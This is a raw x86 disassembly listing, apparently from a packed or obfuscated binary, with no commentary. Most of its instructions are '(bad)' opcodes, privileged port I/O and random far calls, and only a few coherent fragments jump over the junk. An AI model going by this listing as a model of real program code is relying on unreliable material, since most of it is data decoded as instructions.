  411409:	rsqrtps xmm6,XMMWORD PTR [edi-0x46]
  41140d:	add    ebp,DWORD PTR [eax-0x141b62a5]
  411413:	push   ecx
  411414:	mov    ebx,DWORD PTR [esi+0x5d]
  411417:	mov    ch,ch
  411419:	mov    eax,0xcaec219c
  41141e:	(bad)  
  41141f:	loope  0x4113b9
  411421:	xchg   DWORD PTR [esi-0x43],esi
  411424:	mov    cl,0x16
  411426:	cmp    edi,DWORD PTR [edi]
  411428:	ret    0x7aaf
  41142b:	mov    ss,WORD PTR ds:0x15e43bce
  411431:	pop    ebx
  411432:	popf   
  411433:	retf   
  411434:	xchg   ebx,eax
  411435:	pop    ecx
  411436:	imul   edi,DWORD PTR [ecx+0x2c],0x26d4a8d9
  41143d:	pop    edi
  41143e:	retf   
  41143f:	mov    edx,0x37bd90f2
  411444:	fneni(8087 only) 
  411446:	cmp    dh,BYTE PTR [ecx+ebx*1]
  411449:	hlt    
  41144a:	inc    esp
  41144b:	sbb    esi,DWORD PTR [edi]
  41144d:	lods   eax,DWORD PTR ds:[esi]
  41144e:	sbb    esp,DWORD PTR [esi+0x38228715]
  411454:	aas    
  411455:	adc    al,0xa1
  411457:	pop    es
  411458:	outs   dx,BYTE PTR ds:[esi]
  411459:	push   ebp
  41145a:	stos   DWORD PTR es:[edi],eax
  41145b:	dec    ecx
  41145c:	call   FWORD PTR [esi-0x1]
  41145f:	inc    ebp
  411460:	inc    edi
  411461:	mov    eax,0x3a8e82e0
  411466:	sub    eax,0xfad269e9
  41146b:	inc    esi
  41146c:	cs push 0xffffffdc
  41146f:	cwde   
  411470:	in     eax,dx
  411471:	call   0xf02d345f
  411476:	sub    dl,bh
  411478:	mov    eax,?
  41147a:	stos   BYTE PTR es:[edi],al
  41147b:	mov    bh,0x5e
  41147d:	mov    al,ds:0x2a45569c
  411482:	imul   esp,DWORD PTR [esi+0x27],0xfffffff8
  411486:	mov    ebp,0xed8173b9
  41148b:	pop    esi
  41148c:	mov    ebx,0x1a41e5fa
  411491:	hlt    
  411492:	in     eax,0x7f
  411494:	daa    
  411495:	ja     0x411473
  411497:	popa   
  411498:	inc    edx
  411499:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41149a:	jg     0x41146f
  41149c:	lock xlat BYTE PTR ds:[ebx]
  41149e:	test   DWORD PTR [ebp-0x40e69e22],edx
  4114a4:	add    esi,ebp
  4114a6:	cmp    al,0xc7
  4114a8:	sar    BYTE PTR [ebx],cl
  4114aa:	dec    ebx
  4114ac:	sbb    DWORD PTR [edi-0x24eecb0f],ebp
  4114b2:	call   0x7c2e:0xb6ef2503
  4114b9:	out    0xc4,al
  4114bb:	mov    dl,0xd8
  4114bd:	fwait
  4114be:	test   DWORD PTR [esi+0x4a1a6e82],ecx
  4114c4:	cmp    DWORD PTR [eax],edx
  4114c6:	inc    edi
  4114c7:	xor    ebp,DWORD PTR [ebx-0x995a027]
  4114cd:	adc    BYTE PTR [edx-0x35],0x27
  4114d1:	test   al,cl
  4114d3:	push   eax
  4114d4:	and    DWORD PTR [eax-0x3e],ebp
  4114d7:	adc    eax,DWORD PTR [eax-0x3e9e28ce]
  4114dd:	test   ebp,eax
  4114df:	push   ebp
  4114e0:	nop
  4114e1:	mov    esp,0x558213f7
  4114e6:	int    0xe7
  4114e8:	(bad)  
  4114e9:	and    BYTE PTR [ebp-0x74767b41],dh
  4114ef:	jge    0x4114e9
  4114f1:	mov    ebx,DWORD PTR [ebp-0x10]
  4114f4:	sub    ebx,edi
  4114f6:	cmp    ebx,edx
  4114f8:	ja     0x41178e
  4114fe:	jmp    0x411786
  411503:	(bad)  
  411504:	rol    edi,cl
  411506:	(bad)
  411509:	(bad)
  41150c:	xor    bl,BYTE PTR [edi+0x4e]
  41150f:	adc    al,0x4e
  411511:	call   0x789ed4cd
  411516:	js     0x4114fd
  411518:	jle    0x411592
  41151a:	js     0x4114d4
  41151c:	mov    ecx,0xa2e59cb1
  411521:	mov    ds:0x1b489380,al
  411526:	daa    
  411527:	retf   0xa109
  41152a:	rcr    BYTE PTR [edi+0x4d0934a3],0x5
  411531:	mov    al,ds:0x9d728575
  411536:	mov    cl,0x97
  411538:	inc    eax
  411539:	clc    
  41153a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41153b:	test   BYTE PTR [ebp-0x2a3c9b2],bh
  411541:	(bad)  
  411542:	sti    
  411543:	imul   esp,DWORD PTR [edi+0x2eec886b],0xb162ca57
  41154d:	cmp    esp,DWORD PTR [esi-0x4d]
  411550:	daa    
  411551:	add    ch,BYTE PTR [ebx+0x7f]
  411554:	push   ebp
  411555:	aas    
  411556:	add    al,0x65
  411558:	and    BYTE PTR [esp+eax*1],0xf0
  41155c:	or     DWORD PTR [edx-0x7c9a836c],esp
  411562:	test   al,0x96
  411564:	jp     0x411504
  411566:	rol    BYTE PTR [ebx+0x8925a86],0x2a
  41156d:	les    ebx,FWORD PTR [edx]
  41156f:	push   es
  411570:	nop
  411571:	adc    bl,BYTE PTR [esi+0x78]
  411574:	push   ebp
  411575:	mov    esp,0x24333e69
  41157a:	mov    esp,0xc45f505f
  41157f:	push   ds
  411580:	ss adc eax,0x9c579e74
  411586:	pop    ebp
  411587:	(bad)  
  411588:	jbe    0x4115e7
  41158a:	mov    dh,0x2a
  41158c:	ss mov ecx,0xcff471e
  411592:	add    dl,BYTE PTR [edi-0x7f9c1341]
  411598:	jnp    0x4115a3
  41159a:	arpl   WORD PTR [edx+0x23],ax
  41159d:	aas    
  41159e:	scas   eax,DWORD PTR es:[edi]
  41159f:	add    al,BYTE PTR [ebx+0x1646a0a3]
  4115a5:	test   eax,0xc0e01ac3
  4115aa:	iret   
  4115ab:	cmp    edi,DWORD PTR [edx]
  4115ad:	pushf  
  4115ae:	xchg   BYTE PTR [ebp-0x5b],dl
  4115b1:	mov    ebx,0x1fc03358
  4115b6:	pop    ecx
  4115b7:	sub    cl,BYTE PTR [ebp-0x4c]
  4115ba:	out    dx,al
  4115bb:	add    ebp,esp
  4115bd:	sub    dl,al
  4115bf:	sbb    edi,edx
  4115c1:	jne    0x4115b3
  4115c3:	push   ebx
  4115c4:	or     dl,0x49
  4115c7:	sub    DWORD PTR [edx],eax
  4115c9:	or     edi,DWORD PTR [esi-0x7c1c97d1]
  4115cf:	fistp  QWORD PTR [ebx]
  4115d1:	lahf   
  4115d2:	adc    ah,BYTE PTR [esi-0x30]
  4115d5:	retf   
  4115d6:	add    ebx,DWORD PTR [ecx+0x4b]
  4115d9:	jae    0x4115e9
  4115db:	fcmove st,st(4)
  4115dd:	es addr16 out dx,al
  4115e0:	repz dec esi
  4115e2:	imul   ecx,DWORD PTR [esi-0xf5af53a],0x19
  4115e9:	(bad)
  4115ec:	bound  esp,QWORD PTR [ebp-0x792b01ce]
  4115f2:	rcl    BYTE PTR [esi-0x361758ca],cl
  4115f8:	sar    DWORD PTR [ebx],1
  4115fa:	repz icebp 
  4115fc:	into   
  4115fd:	add    al,0x5b
  4115ff:	sbb    DWORD PTR [ebp+0x4b8959a6],edi
  411605:	scas   eax,DWORD PTR es:[edi]
  411606:	out    dx,al
  411607:	imul   ebx,DWORD PTR [edi-0x2],0xfffffff2
  41160b:	push   ebx
  41160c:	js     0x4115d3
  41160e:	ins    DWORD PTR es:[edi],dx
  41160f:	jne    0x4115c6
  411611:	out    dx,eax
  411612:	lods   al,BYTE PTR ds:[esi]
  411613:	adc    eax,0xa287e442
  411618:	dec    ebx
  411619:	daa    
  41161a:	pop    edi
  41161b:	xor    esp,DWORD PTR [eax+0x119e91fa]
  411621:	ds push cs
  411623:	test   ah,ah
  411625:	xor    esi,edi
  411627:	cmp    ecx,DWORD PTR [ebx]
  411629:	inc    eax
  41162a:	push   0x17
  41162c:	and    DWORD PTR [eax+0x69747c45],0x9ebf9be0
  411636:	cmp    dh,BYTE PTR [esp+esi*1]
  411639:	stos   DWORD PTR es:[edi],eax
  41163a:	cmp    ecx,DWORD PTR [ecx-0x2ee4c856]
  411640:	in     eax,dx
  411641:	ret    
  411642:	pop    ebx
  411643:	sbb    ah,BYTE PTR [edi+eiz*4]
  411646:	dec    DWORD PTR [eax+eax*1-0x75688f15]
  41164d:	js     0x411654
  41164f:	stc    
  411650:	ror    bh,1
  411652:	(bad)  
  411653:	aad    0x64
  411655:	clc    
  411656:	and    al,0x39
  411658:	inc    esp
  411659:	popf   
  41165a:	das    
  41165b:	adc    dl,BYTE PTR [ecx+0x402576cc]
  411661:	inc    ebp
  411662:	scas   al,BYTE PTR es:[edi]
  411663:	not    esp
  411665:	aam    0xa0
  411667:	loope  0x4116d2
  411669:	neg    BYTE PTR ds:0xca2e78ec
  41166f:	stos   BYTE PTR es:[edi],al
  411670:	(bad)  
  411671:	retf   0x2636
  411674:	mov    BYTE PTR [ebx-0x17396a60],ch
  41167a:	bsf    edi,esi
  41167d:	(bad)  
  41167e:	xchg   esp,eax
  41167f:	(bad)  
  411680:	fdivr  st(2),st
  411682:	bound  esi,QWORD PTR [edx-0x6e]
  411685:	mov    edi,0x49321b36
  41168a:	cmp    cl,dl
  41168c:	mov    bl,0xb4
  41168e:	and    bl,0x9e
  411691:	fidiv  DWORD PTR [ebp-0x78]
  411694:	addr16 push 0xabe1ed14
  41169a:	mov    eax,ds:0x9bc3e24
  41169f:	mov    al,0x52
  4116a1:	lock cmp eax,0x158102
  4116a7:	mov    cl,0x74
  4116a9:	pop    edx
  4116aa:	or     eax,0x6a
  4116ad:	mov    edx,0xb97cb495
  4116b2:	mov    ebx,0xa0a8e5d1
  4116b7:	bound  eax,QWORD PTR [edx]
  4116b9:	and    eax,0xa601bc84
  4116be:	not    esi
  4116c0:	xchg   ecx,eax
  4116c1:	call   0x9e7c:0x378a6c16
  4116c8:	out    dx,eax
  4116c9:	cdq    
  4116ca:	enter  0x6c7f,0xa2
  4116ce:	mov    ds:0x449d16bf,al
  4116d3:	fisttp WORD PTR [ebp+esi*8+0x442c42ab]
  4116da:	mov    ebx,0xe9c5a7c8
  4116df:	adc    al,0xe
  4116e1:	ror    BYTE PTR [eax],0x84
  4116e4:	cmp    eax,DWORD PTR [ecx]
  4116e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e7:	mov    edx,0x665ce711
  4116ec:	mov    cl,0xc1
  4116ee:	inc    ecx
  4116ef:	dec    ebp
  4116f0:	mov    BYTE PTR [edx+0xb],al
  4116f3:	sti    
  4116f4:	fistp  QWORD PTR [esi]
  4116f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116f7:	hlt    
  4116f8:	fnstcw WORD PTR [eax+0x37f8a492]
  4116fe:	jge    0x4116d5
  411700:	sub    ch,0x2a
  411703:	loope  0x411762
  411705:	lahf   
  411706:	test   al,0xce
  411708:	mov    ds:0x1f36d3a3,al
  41170d:	push   cs
  41170e:	xchg   edx,eax
  41170f:	bound  ebx,QWORD PTR [edi+ebx*2+0x13]
  411713:	mov    edx,0xd5ed9533
  411718:	int3   
  411719:	test   eax,0xb1e49f34
  41171e:	cmp    al,0x57
  411720:	xchg   esi,eax
  411721:	sti    
  411722:	xor    al,0x9d
  411724:	ins    BYTE PTR es:[edi],dx
  411725:	fwait
  411726:	jnp    0x411766
  411728:	leave  
  411729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41172a:	xor    BYTE PTR [eax+0x34],ah
  41172d:	mov    es,WORD PTR [eax]
  41172f:	je     0xfd398c24
  411735:	xchg   DWORD PTR [edi-0x74],edx
  411738:	and    eax,0x619782b7
  41173d:	out    0x44,al
  41173f:	mov    ebx,0xf6a9525c
  411744:	xchg   ebx,eax
  411745:	pusha  
  411746:	das    
  411747:	cmp    ah,BYTE PTR [esi+0x4]
  41174a:	mov    ds:0x60d4b98d,al
  41174f:	sub    DWORD PTR [ebp-0x7e],ecx
  411752:	inc    ecx
  411753:	push   esi
  411754:	repnz lea edi,[eax]
  411757:	jbe    0x41179f
  411759:	jle    0x4116df
  41175b:	pop    edx
  41175c:	and    ah,bh
  41175e:	imul   eax,DWORD PTR [edi],0x2019672d
  411764:	pop    ecx
  411765:	shr    BYTE PTR [eax+0x52],0x5a
  411769:	call   0xc952:0x7f78e53e
  411770:	pop    ds
  411771:	retf   
  411772:	nop
  411773:	stos   BYTE PTR es:[edi],al
  411774:	loopne 0x411737
  411776:	sti    
  411777:	(bad)  
  411778:	sbb    al,0xad
  41177a:	ret    
  41177b:	mov    dh,0xfa
  41177d:	push   cs
  41177e:	push   0xb2f24af5
  411783:	popa   
  411784:	out    dx,al
  411785:	mov    dh,0x8b
  411787:	push   ebp
  411788:	shr    cl,1
  41178a:	call   0x8b411796
  41178f:	push   ebp
  411790:	enter  0x7d8b,0xfc
  411794:	xor    edx,eax
  411796:	xor    edi,eax
  411798:	add    edi,ecx
  41179a:	add    edx,ecx
  41179c:	imul   edx,edi
  41179f:	mov    edi,DWORD PTR [ebp-0x8]
  4117a2:	jmp    0x411a2a
  4117a7:	iret   
  4117a8:	leave  
  4117a9:	into   
  4117aa:	xlat   BYTE PTR ds:[ebx]
  4117ab:	fcmovu st,st(3)
  4117ad:	aad    0xc9
  4117af:	cli    
  4117b0:	je     0x411765
  4117b2:	sti    
  4117b3:	retf   
  4117b4:	mov    ds:0x62248661,eax
  4117b9:	js     0x411833
  4117bb:	in     eax,0x7e
  4117bd:	js     0x411837
  4117bf:	mov    ah,0x73
  4117c1:	gs jmp 0x292eb580
  4117c7:	mov    ebx,0x908fb157
  4117cc:	ficom  DWORD PTR [ebx]
  4117ce:	nop
  4117cf:	mov    edx,0xbfa2e8d6
  4117d4:	xchg   esp,eax
  4117d5:	cld    
  4117d6:	mov    ebp,0x4a38138e
  4117db:	das    
  4117dc:	aaa    
  4117dd:	adc    eax,0x12520f8d
  4117e2:	sbb    ch,BYTE PTR [eax]
  4117e4:	rol    DWORD PTR [edx+esi*1+0x43],1
  4117e8:	mov    ch,0x46
  4117ea:	jo     0x4117bb
  4117ec:	push   ecx
  4117ed:	add    eax,ecx
  4117ef:	shr    edi,1
  4117f1:	in     al,0xde
  4117f3:	or     eax,0xfd99fd11
  4117f8:	mov    edx,0xe7449b56
  4117fd:	jno    0x4117cf
  4117ff:	inc    ebx
  411800:	cmc    
  411801:	stos   DWORD PTR es:[edi],eax
  411802:	jbe    0x41181a
  411804:	fldcw  WORD PTR [edx+ecx*1+0x1b]
  411808:	lods   eax,DWORD PTR ds:[esi]
  411809:	mov    ss:0x6146436,eax
  41180f:	test   DWORD PTR [edi],0xb6fd7aa1
  411815:	cmp    eax,DWORD PTR [edx+esi*4-0x76]
  411819:	sub    DWORD PTR [eax-0x3d],edi
  41181c:	ret    
  41181d:	pop    esi
  41181e:	daa    
  41181f:	push   0xffffffc8
  411821:	stc    
  411822:	or     al,0x57
  411824:	and    cl,bh
  411826:	mov    esi,esi
  411828:	push   ebp
  411829:	mov    ah,0x14
  41182b:	xor    cl,ah
  41182d:	sbb    cl,0x18
  411830:	ret    
  411831:	retf   
  411832:	imul   dh
  411834:	push   esi
  411835:	and    eax,esp
  411837:	fsin   
  411839:	popf   
  41183a:	bound  ebp,QWORD PTR [edx+0x4cb9ba57]
  411840:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411841:	pop    ecx
  411842:	adc    BYTE PTR ds:0xc81ae285,0xc8
  411849:	ss sti 
  41184b:	mov    bh,bl
  41184d:	and    BYTE PTR [ecx-0x11],al
  411850:	sti    
  411851:	js     0x41185f
  411853:	sub    eax,0xb28f894a
  411858:	jns    0x4118d2
  41185a:	jb     0x4118cd
  41185c:	mov    cl,0xcc
  41185e:	jmp    0x4117f0
  411860:	test   eax,0xab1ad2e0
  411865:	add    al,0xe1
  411867:	cmp    ch,ah
  411869:	push   DWORD PTR [ecx-0x11]
  41186c:	inc    ecx
  41186d:	fldpi  
  41186f:	mov    dl,0xea
  411871:	sti    
  411872:	or     al,0x5c
  411874:	(bad)  
  411876:	ja     0x41182a
  411878:	ss pop ds
  41187a:	nop    DWORD PTR [ebx+0x855b947]
  411881:	xchg   esi,eax
  411882:	fnstsw WORD PTR [esi-0x1f]
  411885:	adc    DWORD PTR ds:0x561d7f07,edx
  41188b:	mov    ecx,0x9e5028c3
  411890:	mov    bh,0x6a
  411892:	xchg   ebp,eax
  411893:	xchg   DWORD PTR ds:0x6d0eeede,ebx
  411899:	cmp    eax,0xee37e63e
  41189e:	imul   ebp,DWORD PTR [edi],0x3f
  4118a1:	sub    ch,dl
  4118a3:	fs sub eax,0x77f21a7f
  4118a9:	xchg   edi,eax
  4118aa:	jno    0x4a77928e
  4118b0:	cs aaa 
  4118b2:	aam    0x3f
  4118b4:	pop    edi
  4118b5:	xchg   esp,eax
  4118b6:	rcr    DWORD PTR [edx+eiz*1],1
  4118b9:	scas   eax,DWORD PTR es:[edi]
  4118ba:	or     BYTE PTR [ebx],ah
  4118bc:	sub    DWORD PTR [ebp-0x326adaa1],edx
  4118c2:	cmp    eax,0x2cb42e75
  4118c7:	jnp    0x411902
  4118c9:	repz jp 0x411876
  4118cc:	mov    bl,0x1e
  4118ce:	pusha  
  4118cf:	and    ebp,DWORD PTR [ebp+0x19]
  4118d2:	out    0x2b,al
  4118d4:	jmp    0x411948
  4118d6:	je     0x4118ad
  4118d8:	push   ebp
  4118d9:	jle    0x41186d
  4118db:	sub    eax,0x5001e40d
  4118e0:	popa   
  4118e1:	aam    0x33
  4118e3:	push   eax
  4118e4:	jg     0x411926
  4118e6:	bound  edx,QWORD PTR [edi+0x372b0838]
  4118ec:	sbb    esi,ecx
  4118ee:	enter  0x80b1,0xe4
  4118f2:	adc    eax,0xc57da121
  4118f7:	popf   
  4118f8:	(bad)  
  4118fa:	aas    
  4118fb:	jmp    0x4118e7
  4118fd:	fistp  DWORD PTR [esi]
  4118ff:	pop    ebp
  411900:	inc    esp
  411901:	bound  ebp,QWORD PTR [eax-0x28a725e5]
  411907:	les    ebp,FWORD PTR [ebp-0xc]
  41190a:	aaa    
  41190b:	enter  0xd374,0xac
  41190f:	sbb    dl,BYTE PTR [edi]
  411911:	stos   DWORD PTR es:[edi],eax
  411912:	call   0x2198:0x2aff18a9
  411919:	xchg   esi,esp
  41191b:	scas   eax,DWORD PTR es:[edi]
  41191c:	aam    0x4e
  41191e:	xor    esp,ecx
  411920:	xchg   edi,eax
  411921:	out    dx,al
  411922:	push   ss
  411923:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411925:	pusha  
  411926:	fcomp  st(3)
  411928:	cwde   
  411929:	xor    bl,al
  41192b:	xchg   esi,eax
  41192c:	outs   dx,BYTE PTR ds:[esi]
  41192d:	sbb    ebx,DWORD PTR [ebp-0x80]
  411930:	inc    esi
  411931:	pop    ebx
  411932:	pushf  
  411933:	jno    0x4118bd
  411935:	xchg   edi,esp
  411937:	in     eax,dx
  411938:	push   0xffffff8b
  41193a:	mov    ebp,DWORD PTR [esi+0x5b925e4f]
  411940:	arpl   WORD PTR [bx+di+0xc2e],sp
  411945:	inc    edi
  411946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411947:	fwait
  411948:	push   cs
  411949:	popf   
  41194a:	or     al,0x2b
  41194c:	fbld   TBYTE PTR [ebx]
  41194e:	mov    esi,0x7e054661
  411953:	in     eax,0x88
  411955:	daa    
  411956:	aam    0x7b
  411958:	jae    0x41196d
  41195a:	gs lahf 
  41195c:	iret   
  41195d:	cmp    edx,DWORD PTR [edx+0x76]
  411960:	adc    ch,dl
  411962:	stc    
  411963:	test   BYTE PTR [eax-0x72],bl
  411966:	fwait
  411967:	jno    0x41197b
  411969:	ret    0xd4e4
  41196c:	pushf  
  41196d:	rcr    DWORD PTR [edi+0x60978bc9],1
  411973:	add    BYTE PTR [ecx+edx*2+0x4f],bh
  411977:	out    0x31,al
  411979:	div    BYTE PTR [esi]
  41197b:	in     al,dx
  41197c:	sub    eax,0x8e05286e
  411981:	push   ebp
  411982:	pop    eax
  411983:	pop    esi
  411984:	ins    DWORD PTR es:[edi],dx
  411985:	mov    esp,0x53c050dc
  41198a:	cmp    DWORD PTR [esi-0x65aa28c7],0xffffffc4
  411991:	inc    esp
  411992:	jmp    0x411989
  411994:	mov    ah,0x62
  411996:	cmp    DWORD PTR [eax],0x60
  411999:	push   ecx
  41199a:	mov    cl,0x9e
  41199c:	(bad)  
  41199d:	xchg   ebp,eax
  41199e:	es inc esp
  4119a0:	or     edi,DWORD PTR ds:0x32cb63ae
  4119a6:	sti    
  4119a7:	jmp    0x5993:0x89a3fa85
  4119ae:	ins    BYTE PTR es:[edi],dx
  4119af:	mov    ecx,0xcae4f3fe
  4119b4:	ins    BYTE PTR es:[edi],dx
  4119b5:	mov    eax,ds:0xe568aa84
  4119ba:	mov    eax,0x78d7c5f6
  4119bf:	and    al,0x25
  4119c1:	add    ebp,esi
  4119c3:	out    dx,eax
  4119c4:	popa   
  4119c5:	xor    bl,BYTE PTR [edi+0x60ec572d]
  4119cb:	adc    eax,DWORD PTR ds:0x30e29d1e
  4119d1:	inc    ebp
  4119d2:	test   eax,0xdf793b6
  4119d7:	cmp    cl,ch
  4119d9:	rcl    DWORD PTR [edx],0xff
  4119dc:	inc    esp
  4119dd:	mov    BYTE PTR [ebx],bh
  4119df:	pop    ecx
  4119e0:	loope  0x4119b7
  4119e2:	and    DWORD PTR [ebp+0x7fcb718c],0xbe2afce8
  4119ec:	out    0xdd,al
  4119ee:	xor    eax,0xcc427d9a
  4119f3:	and    bh,BYTE PTR [edx+0x31]
  4119f6:	ins    DWORD PTR es:[edi],dx
  4119f7:	icebp  
  4119f8:	inc    eax
  4119f9:	enter  0x7d87,0x7d
  4119fd:	cmp    ch,BYTE PTR [ebx+0x2a]
  411a00:	jbe    0x411a6c
  411a02:	push   ss
  411a03:	iret   
  411a04:	xchg   ebx,eax
  411a05:	xor    eax,0xff6ad7a5
  411a0a:	and    eax,0x9957f59d
  411a10:	arpl   WORD PTR [edi-0x67114f2b],dx
  411a16:	in     al,0xa4
  411a18:	and    DWORD PTR [eax+0x62],eax
  411a1b:	test   BYTE PTR [eax-0x65],0x75
  411a1f:	mov    ebp,0x9c80982e
  411a24:	enter  0xd105,0xc1
  411a28:	xlat   BYTE PTR ds:[ebx]
  411a29:	pop    ebp
  411a2a:	mov    ebx,DWORD PTR [ebp-0x10]
  411a2d:	sub    ebx,edi
  411a2f:	cmp    ebx,edx
  411a31:	ja     0x411a3f
  411a37:	mov    edx,DWORD PTR [ebp-0x34]
  411a3a:	jmp    0x411f76
  411a3f:	mov    edx,DWORD PTR [ebp-0x3c]
  411a42:	mov    edi,DWORD PTR [ebp-0x4]
  411a45:	xor    edx,eax
  411a47:	xor    edi,eax
  411a49:	add    edx,ecx
  411a4b:	add    edi,ecx
  411a4d:	imul   edx,edi
  411a50:	jmp    0x411cd8
  411a55:	into   
  411a56:	(bad)  
  411a57:	cmp    al,0xc7
  411a59:	fxch   st(3)
  411a5b:	(bad)  
  411a5d:	sub    eax,0xe3d7da8b
  411a62:	cmp    ecx,esp
  411a64:	rcl    BYTE PTR [ecx-0x1a8787a0],0x7e
  411a6b:	js     0x411ae5
  411a6d:	xor    edx,DWORD PTR [ecx]
  411a6f:	inc    esp
  411a70:	jecxz  0x411a80
  411a72:	push   eax
  411a73:	xchg   ebx,eax
  411a74:	dec    ebp
  411a75:	adc    cl,BYTE PTR [edi+0x6f1194f9]
  411a7b:	ds aad 0x78
  411a7e:	sahf   
  411a7f:	xchg   BYTE PTR [esp+edi*4],al
  411a82:	add    BYTE PTR [edi],dh
  411a84:	and    eax,0x1fac8846
  411a89:	retf   0x85f8
  411a8c:	sbb    BYTE PTR [eax-0x7f80b37d],cl
  411a92:	sub    edx,ecx
  411a94:	inc    esp
  411a95:	pop    ecx
  411a96:	adc    eax,0x21e357b
  411a9b:	sub    al,0x9d
  411a9d:	es inc esi
  411a9f:	adc    al,0x57
  411aa1:	mov    ds:0xb1d2729d,eax
  411aa6:	or     al,dl
  411aa8:	ret    0xf187
  411aab:	jp     0x411a87
  411aad:	cmp    al,0x17
  411aaf:	pop    ds
  411ab0:	inc    edx
  411ab1:	call   0xd1e595b6
  411ab6:	mov    esi,0x6ce5d5e6
  411abb:	jge    0x411af8
  411abd:	stos   BYTE PTR es:[edi],al
  411abe:	push   ebp
  411abf:	push   edx
  411ac0:	fisubr WORD PTR [edi-0x765ff36]
  411ac6:	mov    edx,0x35eafaed
  411acb:	cmc    
  411acc:	outs   dx,BYTE PTR ds:[esi]
  411ace:	add    dh,cl
  411ad0:	jae    0x411aa4
  411ad2:	jmp    0x19e6:0x4bd5db1f
  411ad9:	shl    DWORD PTR [ecx-0x19],0x2f
  411add:	fldcw  WORD PTR [ecx+ebx*1-0x7b]
  411ae1:	ja     0x411b09
  411ae3:	clc    
  411ae4:	mov    ds:0x80e5fc49,al
  411ae9:	sti    
  411aea:	xor    eax,0x4d180dd9
  411aef:	ror    BYTE PTR [ebx],1
  411af1:	and    DWORD PTR [ecx],edx
  411af3:	xchg   ebx,eax
  411af4:	gs out dx,al
  411af6:	pusha  
  411af7:	pop    eax
  411af8:	mov    ch,0x74
  411afa:	push   0x9cdb6d14
  411aff:	adc    ebx,DWORD PTR [ecx]
  411b01:	stc    
  411b02:	cdq    
  411b03:	out    0xb0,al
  411b05:	pop    ecx
  411b06:	mov    ah,0xcc
  411b08:	sti    
  411b09:	daa    
  411b0a:	repnz in eax,dx
  411b0c:	mov    cl,0x2
  411b0e:	xor    BYTE PTR gs:[ebx+0x69],cl
  411b12:	cmp    edx,DWORD PTR [ebx+0x15e75e79]
  411b18:	or     ebp,DWORD PTR [esi-0x20]
  411b1b:	(bad)  
  411b1d:	lea    ebp,[esi-0x75]
  411b20:	retf   0x8a3f
  411b23:	push   edi
  411b24:	test   eax,0xdfe5894d
  411b29:	fmul   DWORD PTR [edx]
  411b2b:	xlat   BYTE PTR ds:[ebx]
  411b2c:	and    DWORD PTR ds:0x33eb2603,esi
  411b32:	inc    edi
  411b33:	jge    0x411b03
  411b35:	xchg   esi,eax
  411b36:	push   0xf594c1f2
  411b3b:	cmp    dh,BYTE PTR [ebp+0x60523f1d]
  411b41:	and    ch,bh
  411b43:	sbb    bl,dh
  411b45:	retf   0xddc5
  411b48:	aam    0xbf
  411b4a:	pop    ss
  411b4b:	mov    ch,0x99
  411b4d:	mov    esi,0x9ceba7ed
  411b52:	shl    DWORD PTR [edx-0x57],1
  411b55:	mov    BYTE PTR [ecx],bh
  411b57:	fwait
  411b58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b59:	clc    
  411b5a:	xchg   ecx,eax
  411b5b:	rol    DWORD PTR [ebx+0xf],1
  411b5e:	jno    0x411afb
  411b60:	and    DWORD PTR [ecx+esi*8-0x2a],eax
  411b64:	jg     0x411b5a
  411b66:	xchg   edi,eax
  411b67:	fiadd  WORD PTR [esi-0x1bd7fe2d]
  411b6d:	pop    ss
  411b6e:	sub    ch,BYTE PTR [eax+0xa]
  411b71:	outs   dx,DWORD PTR ds:[esi]
  411b72:	adc    BYTE PTR [ebp+esi*8+0x68f95ae2],bl
  411b79:	aaa    
  411b7a:	data16 daa 
  411b7c:	fcmovb st,st(2)
  411b7e:	ja     0x411bc6
  411b80:	ret    
  411b81:	add    DWORD PTR [ebp+esi*8-0x3],ebp
  411b85:	sbb    eax,0xcb54a67f
  411b8a:	push   ecx
  411b8b:	cmp    edx,DWORD PTR ds:0x450be65e
  411b91:	dec    edi
  411b92:	es jmp 0x411b41
  411b95:	xchg   esi,eax
  411b96:	dec    eax
  411b97:	aad    0x89
  411b99:	or     dl,bl
  411b9b:	push   0xb
  411b9d:	ins    DWORD PTR es:[edi],dx
  411b9e:	jle    0x411b9d
  411ba0:	jmp    0x56394232
  411ba5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ba6:	sbb    DWORD PTR [esi-0x13026dc8],0x29
  411bad:	outs   dx,DWORD PTR ds:[esi]
  411bae:	test   al,0x42
  411bb0:	push   ds
  411bb1:	mul    BYTE PTR [ebx-0x28]
  411bb4:	pop    ds
  411bb5:	stos   DWORD PTR es:[edi],eax
  411bb6:	add    dl,BYTE PTR [edi+0x6e6d6151]
  411bbc:	stos   DWORD PTR es:[edi],eax
  411bbd:	icebp  
  411bbe:	stos   BYTE PTR es:[edi],al
  411bbf:	fcmovne st,st(0)
  411bc1:	push   cs
  411bc2:	push   ebx
  411bc3:	add    esp,DWORD PTR [esi+0x1d4f7d8b]
  411bc9:	inc    eax
  411bca:	sbb    bl,BYTE PTR [edi+0x56]
  411bcd:	and    DWORD PTR [esp+0x3b737001],ebp
  411bd4:	stc    
  411bd5:	into   
  411bd6:	(bad)  
  411bd7:	lock imul bh
  411bda:	mov    DWORD PTR [edi+0x66],edx
  411bdd:	jmp    0x411c10
  411bdf:	xor    DWORD PTR [eax+0x60],eax
  411be2:	test   al,0xcd
  411be4:	je     0x411c5c
  411be6:	hlt    
  411be7:	mov    ebx,0xea6e0ad8
  411bec:	mov    esp,edx
  411bee:	or     bl,ah
  411bf0:	arpl   WORD PTR [edx-0x26299aa0],dx
  411bf6:	fsub   QWORD PTR [eax+0x27]
  411bf9:	popa   
  411bfa:	inc    edx
  411bfb:	sub    ebx,DWORD PTR [ebp+0x3a]
  411bfe:	test   al,0x39
  411c00:	dec    eax
  411c01:	aas    
  411c02:	ja     0x411bf2
  411c04:	add    eax,ecx
  411c06:	(bad)  
  411c07:	lock adc ecx,DWORD PTR [ebx-0x6b88f082]
  411c0e:	cli    
  411c0f:	cmp    DWORD PTR [ebp+0x18d4eae8],ebx
  411c15:	pop    ebp
  411c16:	fisub  DWORD PTR [edx]
